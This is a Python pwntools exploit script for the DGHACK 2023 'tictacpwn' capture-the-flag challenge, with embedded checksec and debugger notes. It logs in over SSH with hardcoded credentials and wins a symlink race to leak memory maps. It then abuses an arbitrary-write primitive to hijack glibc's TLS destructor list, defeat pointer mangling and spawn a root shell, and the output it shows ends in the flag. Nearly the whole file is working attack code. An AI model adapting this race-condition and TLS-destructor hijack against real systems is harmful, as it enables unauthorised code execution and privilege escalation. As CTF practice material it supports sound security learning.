from pwn import *
import os

"""
What do you pick ?
1. Rock
2. Paper
3. Scissors
Wrong choice !
Bot wins!
You chose to exit. Bye!
# /bin/sh: 1: d: not found
# $ id
uid=0(root) gid=1000(user) groups=1000(user),100(users)
# $ /readflag
DGHACK{02e40ba7c9b7a01605044006f2c18e37de31415a74e6de8cf4702db6e95e1632}
"""

"""
checksec --file ./tictacpwn 
[*] '/home//Bureau/PreviousCTF/dghack23/tictacpwn/tictacpwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

# No seccomp

"""
db977d0e81ac355d7387c6a65fd53f3f0a463467df99d26a261905f9e8fddf52  server
db977d0e81ac355d7387c6a65fd53f3f0a463467df99d26a261905f9e8fddf52  tictacpwn

ssh-3ap2a9.inst.malicecyber.com
ssh user@ssh-3ap2a9.inst.malicecyber.com -p 4096 -o ServerAliveInterval=30 -o ServerAliveCountMax=2

scp -P 4096 user@ssh-htuuyr.inst.malicecyber.com:/challenge/tictacpwn ./server
scp -P 4096 user@ssh-zytwx2.inst.malicecyber.com:/usr/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
scp -P 4096 user@ssh-zytwx2.inst.malicecyber.com:/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2

pwninit
"""

# HINT tictacpwn
# HINT toctoupwn ?

# SSH Connection details
remote_host = "ssh-3ap2a9.inst.malicecyber.com"
remote_port = 4096
remote_user = "user"
remote_password = "user"

"""
ln -s /tmp/Card.txt /tmp/card.txt

aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaa
"""

def toc(name="card.txt"):
	# Awaiting the choice
	io.recvuntil(b"Do you want to load a custom card for rock ? (y/n) ")
	# Yes
	io.sendline(b"y")
	# Awating card name
	io.recvuntil(b"Give me the path to the custom card:")
	
	### local
	#with open("/tmp/Card.txt","w+") as fp:
	#	for i in range(16):
	#		fp.write("a"*16+"\n")
	# Initially it is called card.txt
	
	toctou.sendline(b'rm /tmp/electro/card.txt')
	toctou.sendline(b"mkdir /tmp/electro")
	toctou.sendline(b"cd /tmp/electro")
	toctou.sendline(b'echo "'+b'aaaaaaaaaaaaaaaa\n'*15+b'aaaaaaaaaaaaaaaa'+b'" > /tmp/electro/card')
	toctou.sendline(b"chmod 777 /tmp/electro/card")
	toctou.sendline(b'ln -s /tmp/electro/card card.txt')
	pause(3)
	io.sendline(name.encode())
	
	
def tou():
	# Oopsy
	toctou.sendline(b'rm /tmp/electro/card.txt')
	toctou.sendline(b"ln -s /proc/self/maps card.txt")
	
	
def analyseLeak(data):
	# get the PIE, Libc, Heap & TLS
	lines=[]
	pie  = None
	libc = None
	heap = None
	tls  = None
	stack = None
	for elt in data.split(b"\n"):
		print(elt)
		if b"tictacpwn" in elt and pie is  None:
			pie = int(elt.split(b"-")[0],16)
		if b"heap" in elt and heap is  None:
			heap = int(elt.split(b"-")[0],16)
		if b"libc" in elt and libc is None:
			libc = int(elt.split(b"-")[0],16)
	return pie,libc,heap
	
def leak():
	# Annonce the choice 1
	pause(1)
	io.sendline(b"1")
	
	# Awaiting the choice
	io.recvuntil(b"You chose rock !\n")
	data=io.recvuntil(b"Rock - Paper - Scissors\n")
	print(data)
	pie,libc,heap=analyseLeak(data)
	print("PIE",hex(pie))
	print("LIBC",hex(libc))
	print("HEAP",hex(heap))
	return pie,libc,heap
	
def lucky():
	# Joke
	while 1:
		# Paper for Crying
		io.sendline(b"2")
		data=io.recvuntil(b"You're now allowed to write 8 bytes wherever you want !",timeout=0.1)
		if b"bytes" in data:
			break

def www(what,where):
	# Ok let's be lucky we play paper only
	lucky()
	print("WHERE",where)
	io.recvuntil(b"Where do you want to write ?")
	io.sendline(where.encode())
	print("WHAT",what)
	io.recvuntil(b"What do you want to write ?")
	io.sendline(what.encode())
		
def rol_11_64bit(value):
	# Effectuer une rotation gauche de 11 bits sur un entier 64 bits
	return ((value << 0x11) | (value >> (64 - 0x11))) & 0xFFFFFFFFFFFFFFFF

# Binarie names
chall = "./tictacpwn_patched"
lib   = "./libc.so.6"

# Binaries
elf = ELF(chall)
libc = ELF(lib)

#gdb script
#break __call_tls_dtors+61
script="""
b* quit
c
"""

# Running the challenge
#io = gdb.debug(chall,gdbscript=script)
#io = process(chall)

s  = ssh(host=remote_host, port=remote_port, user=remote_user, password=remote_password)
io = s.process("/challenge/tictacpwn")


ss  = ssh(host=remote_host, port=remote_port, user=remote_user, password=remote_password)
toctou = ss.process("/bin/sh")
	

# Time Of Check
toc(name="/tmp/electro/card.txt")

# Time Of Use
tou()

# Analyse Leak
_pie,_libc,_heap= leak()

# Updating adress
elf.address = _pie
libc.address = _libc

# Write What Where Part
www(hex(0),hex(elf.symbols["SEED"]))

# ROP CHAIN
onegadget = libc.address+0xf2592
libc_to_tls = 0xffffffffffffd740
tls = (libc.address+libc_to_tls)%(2**64)
print("TLS",hex(tls))

tls_list = (tls + 0xffffffffffffffa8) % (2**64)
tls_obj  = tls_list + 8 
tls_map  = tls_obj + 8
tls_next = tls_map + 8
key	=  tls+0x30

print("BINSH",hex(next(libc.search(b'/bin/sh'))))

www(hex(tls+0x38),hex(tls_list))
www(hex(next(libc.search(b'/bin/sh'))),hex(tls_obj))
www(hex(0),hex(tls_map))
www(hex(0),hex(tls_next))
www(hex(0),hex(key))
www(hex(rol_11_64bit(libc.symbols["system"])),hex(tls+0x38))
www(hex(next(libc.search(b'/bin/sh'))),hex(tls+0x38+8))

"""
TLS

p $fs_base
$1 = 0x7fb7e2ed2740
gef➤  x/32gx $fs_base
0x7fb7e2ed2740:	0x00007fb7e2ed2740	0x00007fb7e2ed30e0
0x7fb7e2ed2750:	0x00007fb7e2ed2740	0x0000000000000000

0x0000560b6ccd5000 0x0000560b6ccd6000 0x0000000000005000 rw- /home//Bureau/PreviousCTF/dghack23/tictacpwn/tictacpwn_patched
0x0000560b6dd8a000 0x0000560b6ddab000 0x0000000000000000 rw- [heap]
0x00007fb7e2ed2000 0x00007fb7e2ed5000 0x0000000000000000 rw- 

info functions dtors
All functions matching regular expression "dtors":

Non-debugging symbols:
0x00007fb7e2f13170  __call_tls_dtors
gef➤  disass __call_tls_dtors
Dump of assembler code for function __call_tls_dtors:
   0x00007fb7e2f13170 <+0>:	push   rbp
   0x00007fb7e2f13171 <+1>:	push   rbx
   0x00007fb7e2f13172 <+2>:	sub    rsp,0x8
   0x00007fb7e2f13176 <+6>:	mov    rbp,QWORD PTR [rip+0x193be3]        # 0x7fb7e30a6d60
   0x00007fb7e2f1317d <+13>:	mov    rbx,QWORD PTR fs:[rbp+0x0]
   0x00007fb7e2f13182 <+18>:	test   rbx,rbx
   0x00007fb7e2f13185 <+21>:	je     0x7fb7e2f131ce <__call_tls_dtors+94>
   0x00007fb7e2f13187 <+23>:	nop    WORD PTR [rax+rax*1+0x0]
   0x00007fb7e2f13190 <+32>:	mov    rdx,QWORD PTR [rbx+0x18]
   0x00007fb7e2f13194 <+36>:	mov    rax,QWORD PTR [rbx]
   0x00007fb7e2f13197 <+39>:	ror    rax,0x11
   0x00007fb7e2f1319b <+43>:	xor    rax,QWORD PTR fs:0x30
   0x00007fb7e2f131a4 <+52>:	mov    QWORD PTR fs:[rbp+0x0],rdx
   0x00007fb7e2f131a9 <+57>:	mov    rdi,QWORD PTR [rbx+0x8]
   0x00007fb7e2f131ad <+61>:	call   rax
   0x00007fb7e2f131af <+63>:	mov    rax,QWORD PTR [rbx+0x10]
   0x00007fb7e2f131b3 <+67>:	lock sub QWORD PTR [rax+0x480],0x1
   0x00007fb7e2f131bc <+76>:	mov    rdi,rbx
   0x00007fb7e2f131bf <+79>:	call   0x7fb7e2efb360 <free@plt>
   0x00007fb7e2f131c4 <+84>:	mov    rbx,QWORD PTR fs:[rbp+0x0]
   0x00007fb7e2f131c9 <+89>:	test   rbx,rbx
   0x00007fb7e2f131cc <+92>:	jne    0x7fb7e2f13190 <__call_tls_dtors+32>
   0x00007fb7e2f131ce <+94>:	add    rsp,0x8
   0x00007fb7e2f131d2 <+98>:	pop    rbx
   0x00007fb7e2f131d3 <+99>:	pop    rbp
   0x00007fb7e2f131d4 <+100>:	ret    
End of assembler dump.

gef➤  x/32gx $fs_base+0xffffffffffffffa8-8
0x7fb7e2ed26e0:	0x0000000000000000	0x0000000000000000 <<<
0x7fb7e2ed26f0:	0x0000000000000000	0x0000560b6dd8a010
0x7fb7e2ed2700:	0x0000000000000000	0x00007fb7e30a7c60
0x7fb7e2ed2710:	0x0000000000000000	0x0000000000000000
0x7fb7e2ed2720:	0x0000000000000000	0x0000000000000000
0x7fb7e2ed2730:	0x0000000000000000	0x0000000000000000
0x7fb7e2ed2740:	0x00007fb7e2ed2740	0x00007fb7e2ed30e0
0x7fb7e2ed2750:	0x00007fb7e2ed2740	0x0000000000000000
0x7fb7e2ed2760:	0x0000000000000000	0xe577eafc590e1100
0x7fb7e2ed2770:	0x3fcc66b44d1dd570	0x0000000000000000



"""
# Manual Interaction
io.interactive()





